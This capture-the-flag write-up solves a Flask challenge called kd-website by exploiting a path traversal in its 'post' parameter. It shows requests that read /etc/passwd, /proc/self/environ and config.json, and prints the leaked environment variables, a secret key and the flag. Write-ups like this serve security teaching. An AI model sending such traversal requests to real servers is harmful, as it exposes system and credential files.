# kd-website

Proposed difficulty: `Something`

9 solves

```text
"Jeg synes du skal holde dig til crypto challenges" - bootcamp deltager 2023
```

Attachments:

```text
Archive:  challenge.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2024-01-10 16:09   app/
       59  2024-01-03 10:14   app/flag.txt
        0  2024-01-10 16:09   app/posts/
      159  2024-01-03 10:14   app/posts/cryptography.txt
      608  2024-01-03 10:14   app/posts/sunglasses.txt
      990  2024-01-03 10:14   app/posts/index.txt
      657  2024-01-03 10:14   app/posts/pokedex.txt
        8  2024-01-03 10:14   app/config.json
     1248  2024-01-08 23:22   app/main.py
      163  2024-01-03 10:14   app/page.html
      100  2024-01-03 10:14   docker-compose.yml
      188  2024-01-03 10:14   Dockerfile
       30  2024-01-03 10:14   requirements.txt
---------                     -------
     4210                     13 files
```

# Solution

## Environment

Let's start by looking at the `Dockerfile`:

```dockerfile
FROM python:3.10

WORKDIR /app/website

COPY requirements.txt .
RUN pip install -r requirements.txt

COPY ./app/ ./

CMD ["gunicorn", "--workers", "1", "--bind", "0.0.0.0:80", "main:app"]
```

The Dockerfile sets up a simple Python environment, installs the requirements, and then copies the contents of the app folder, as the workdir, located in `/app/website`.

## Arbitrary File Read (almost)

Here are the contents of `main.py`:

```py
from flask import Flask, request, Response, render_template_string, session
import json, os

app = Flask(__name__)

# Util stuff
def readfile(path):
    return open(path, "r").read()

def get_query(request):
    query = {}
    query.update(request.args)
    query.update(request.form)
    return query

# Load data
try:
    FLAG = readfile("flag.txt")
except:
    FLAG = "DDC{LOCALFLAG}"
try:
    app.config["SECRET_KEY"] = json.loads(readfile("config.json"))["SECRET_KEY"]
except:
    app.config["SECRET_KEY"] = os.urandom(32).hex()

# Please no leak my flag
def is_flag(path,flag):
    # avoid shenanigans
    return os.path.exists(os.path.abspath(path)) and readfile(path) == flag


@app.route('/', methods=['GET', 'POST'])
def index():
    if 'account_type' in session:
        privilige = session["account_type"]
    else:
        session["account_type"] = "USER"
        privilige = "USER"


    requested = get_query(request).get('post', 'index.txt')
    path = os.path.join("posts", requested)

    if not privilige == "ADMIN":
        if is_flag(path,FLAG):
            return "ERROR: that's not one of my posts, stop that!"
    
    text = readfile(path)
    
    return render_template_string(readfile('page.html'), path=path, text=text)
```

We can see that there is only one endpoint, which takes our user session into account. We are set to privilege level `USER` by default, but we would like to be able to read the flag. But that requires us to be privilege level `ADMIN`.

An interesting sidenote is that we can read any file on the system as the `post` get parameter is not secured against path traversal. We can therefore read arbitrary files such as `/etc/password` by going to `/?post=../../../etc/passwd`.

There are two ways to solve this challenge that I found.

## Solution 1 (Unintended maybe?)

As we can read arbitrary files, as long as it is not the flag. We can take a peek into the `/proc` filesystem. On linux systems, the file `/proc/self/environ` is a text file with all the environment variables of the current process, separated by null bytes.

For some reason the flag is in the environment variables, allowing us to just read this file:

`http://kdwebsite.hkn/?post=../../../proc/self/environ`

Response:

```text
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=f00be09dde3a
DDC{oopsy-woopsy-my-config-goofy}=HKN{9q-oXE-PP1sM}
LANG=C.UTF-8
GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D
PYTHON_VERSION=3.10.13
PYTHON_PIP_VERSION=23.0.1
PYTHON_SETUPTOOLS_VERSION=65.5.1
PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/4cfa4081d27285bda1220a62a5ebf5b4bd749cdb/public/get-pip.py
PYTHON_GET_PIP_SHA256=9cc01665956d22b3bf057ae8287b035827bfd895da235bcea200ab3b811790b6
HOME=/root
```

Profit?

## Solution 2 (Intended maybe?)

The website fails to take into consideration the file containing the flask secret key.

We can just dump `config.json`, and get the following output:

`http://kdwebsite.hkn/?post=../config.json`

```js
// SECRET KEY for some session data or something? I'm not really sure how configs work. 
// If i just put some random hex string like this it should be fine right?
SECRET_KEY = "99a147c8b967fcc82fe59a7864bec829f2cbc81c50494120f506bab843780558"
```

We could use this to craft our own flask session cookie.

The problem is that this is not JSON data, so I'm pretty sure the app falls back to a completely random secret key.

Not sure if I'm missing something, but I'm pretty sure this challenge is impossible to solve in this way.

# Flag

`DDC{oopsy-woopsy-my-config-goofy}`
